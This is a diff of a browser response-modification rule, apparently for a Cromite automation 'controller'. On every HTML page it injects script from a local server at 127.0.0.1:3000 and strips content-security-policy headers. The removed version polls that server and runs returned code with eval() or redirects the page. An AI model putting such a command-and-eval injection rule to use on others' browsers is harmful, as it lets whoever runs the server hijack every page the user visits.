@@ -1,16 +1,20 @@
 [
   {
-    "id": 1770020078157,
-    "name": "Cromite CLI",
+    "id": 1770022691545,
+    "name": "Cromite Controler",
     "enabled": true,
     "type": "modify",
     "scope": "response",
     "matchUrl": null,
-    "matchHeaders": {
-      "content-type": "text/html"
+    "matchHeaders": {                                                                         "content-type": "text/html"
     },
-    "matchBody": null,                                                                      "matchMethod": null,                                                                    "matchStatusCode": null,                                                                "action": {
-      "injectScript": "setInterval(async () => {  try {    const r = await fetch('http://127.0.0.1:3000');    const cmd = await r.json();    if (cmd.action === 'redirect') window.location.href = cmd.url;    if (cmd.action === 'eval') eval(cmd.code);  } catch (e) {}}, 2000);",
+    "matchBody": null,
+    "matchMethod": null,
+    "matchStatusCode": null,
+    "action": {
+      "injectScript": {
+        "src": "http://127.0.0.1:3000/preload.js"
+      },
       "removeHeaders": [
         "content-security-policy",
         "content-security-policy-report-only",
